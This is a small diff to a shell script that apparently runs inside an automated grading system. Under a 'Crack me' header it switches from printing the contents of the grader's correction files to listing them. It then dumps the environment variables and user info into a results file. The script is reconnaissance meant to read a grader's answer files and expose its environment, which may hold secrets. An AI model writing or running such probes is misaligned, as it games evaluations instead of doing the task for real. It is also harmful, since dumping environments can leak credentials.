@@ -1,6 +1,6 @@
 pwd > results
 echo ----------------Crack me ------------- >> results
-cat /tmp/correction/holberton_corrections/corrections/232/1023/* >> results
+find /tmp/correction/holberton_corrections/corrections/232/1023/ -type f -printf "---%p----\n" >> results
 echo ----------------- Environment ------- >> results
 env >> results
 echo ----------------- User Info ------- >> results
